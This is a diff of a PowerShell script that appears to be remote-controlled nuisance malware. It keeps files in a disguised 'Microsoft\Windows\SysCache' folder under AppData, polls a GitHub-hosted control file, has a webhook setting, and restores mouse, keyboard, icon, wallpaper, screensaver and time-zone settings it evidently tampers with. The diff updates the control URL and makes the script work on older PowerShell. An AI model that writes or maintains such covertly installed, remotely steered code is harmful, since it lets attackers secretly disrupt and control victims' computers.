@@ -5,7 +5,7 @@ Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 
 # ================= CONFIG =================
 $Wh   = ""
-$Ctrl = "https://raw.githubusercontent.com/Ivory0309/flip/main/ctrl.txt"
+$Ctrl = "https://raw.githubusercontent.com/Ivory0309/flip/refs/heads/main/ctrl.txt"
 # ==========================================
 
 $Root  = "$env:APPDATA\Microsoft\Windows\SysCache"
@@ -14,6 +14,8 @@ $Stage = "$Root\stage.dat"
 $Beat  = "$Root\beat.dat"
 $Boot  = "$Root\boot.dat"
 $Orig  = "$Root\orig.dat"
+
+function Val($v, $d) { if ($null -ne $v -and "$v" -ne '') { "$v" } else { $d } }
 
 # ---------- один экземпляр ----------
 New-Item -ItemType Directory $Root -Force | Out-Null
@@ -324,16 +326,16 @@ function Uninstall {
   } catch {}
 
   Set-ItemProperty 'HKCU:\Control Panel\Mouse' 'SwapMouseButtons' 0
-  Set-ItemProperty 'HKCU:\Control Panel\Mouse' 'MouseSensitivity' "$($o.MouseSens ?? '10')"
-  Set-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardDelay' "$($o.KeyDelay ?? '1')"
-  Set-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardSpeed' "$($o.KeySpeed ?? '31')"
+  Set-ItemProperty 'HKCU:\Control Panel\Mouse' 'MouseSensitivity' (Val $o.MouseSens '10')
+  Set-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardDelay' (Val $o.KeyDelay '1')
+  Set-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardSpeed' (Val $o.KeySpeed '31')
   Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' 'HideIcons' 0
   Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' 'HideFileExt' 0
-  Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'ScreenSaveTimeOut' "$($o.ScrnTime ?? '600')"
+  Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'ScreenSaveTimeOut' (Val $o.ScrnTime '600')
   Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'ScreenSaveActive' '1'
-  Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'Wallpaper' "$($o.Wallpaper ?? '')"
-  Set-ItemProperty 'HKCU:\Control Panel\International' 'sTimeFormat' "$($o.TimeFmt ?? 'HH:mm:ss')"
-  Set-ItemProperty 'HKCU:\Control Panel\International' 'sShortTime' "$($o.ShortTime ?? 'HH:mm')"
+  Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'Wallpaper' (Val $o.Wallpaper '')
+  Set-ItemProperty 'HKCU:\Control Panel\International' 'sTimeFormat' (Val $o.TimeFmt 'HH:mm:ss')
+  Set-ItemProperty 'HKCU:\Control Panel\International' 'sShortTime' (Val $o.ShortTime 'HH:mm')
   if ($o.TZ) { tzutil /s $o.TZ }
   rundll32.exe user32.dll,UpdatePerUserSystemParameters
 
